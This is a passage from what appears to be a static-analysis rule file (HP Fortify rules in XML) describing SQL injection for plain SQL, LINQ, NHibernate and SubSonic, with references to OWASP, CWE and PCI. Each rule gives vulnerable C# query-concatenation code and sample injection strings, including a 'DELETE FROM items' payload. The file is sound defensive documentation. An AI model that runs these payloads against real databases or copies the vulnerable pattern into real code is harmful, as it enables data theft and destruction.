							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine if the string is always safe.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where <code>owner</code> matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>string userName = ctx.getAuthenticatedUserName();<br>string query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + ItemName.Text + "'";<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = &lt;userName&gt;<br>        AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>        SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'); DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        --'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure against SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_sql_injection_linq</key>
    <internalKey>Input Validation and Representation/SQL Injection/LINQ</internalKey>
    <name>SQL Injection: LINQ</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic LINQ statement with input coming from an untrusted source might allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Injection errors related to LINQ occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>2. The data is used to dynamically construct a query.<br><br><b>Example 1:</b> The following code dynamically constructs and executes an LINQ query that searches for items matching a specified name. The query restricts the items displayed to those where <code>owner</code> matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>string userName = ctx.getAuthenticatedUserName();<br>string query = "SELECT * FROM items WHERE owner = '"<br>				+ userName + "' AND itemname = '"<br>				+ ItemName.Text + "'";<br><br>var items = dataContext.ExecuteCommand&lt;Item&gt;(query);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = &lt;userName&gt;<br>	AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'); DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing LINQ injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized LINQ statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing LINQ injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to LINQ queries can help, but it will not make your application secure from LINQ injection attacks.<br><br>Another solution commonly proposed for dealing with LINQ injection attacks is to use stored procedures. Although stored procedures prevent some types of LINQ injection attacks, they fail to protect against many others. Stored procedures typically help prevent LINQ injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against LINQ injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_sql_injection_nhibernate</key>
    <internalKey>Input Validation and Representation/SQL Injection/NHibernate</internalKey>
    <name>SQL Injection: NHibernate</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine if the string is always safe.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where <code>owner</code> matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>string userName = ctx.getAuthenticatedUserName();<br>string query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + ItemName.Text + "'";<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = &lt;userName&gt;<br>        AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>        SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'); DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        --'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure against SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_sql_injection_subsonic</key>
    <internalKey>Input Validation and Representation/SQL Injection/SubSonic</internalKey>
    <name>SQL Injection: SubSonic</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine if the string is always safe.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where <code>owner</code> matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>string userName = ctx.getAuthenticatedUserName();<br>string query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + ItemName.Text + "'";<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = &lt;userName&gt;<br>        AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>        SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'); DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        --'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure against SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
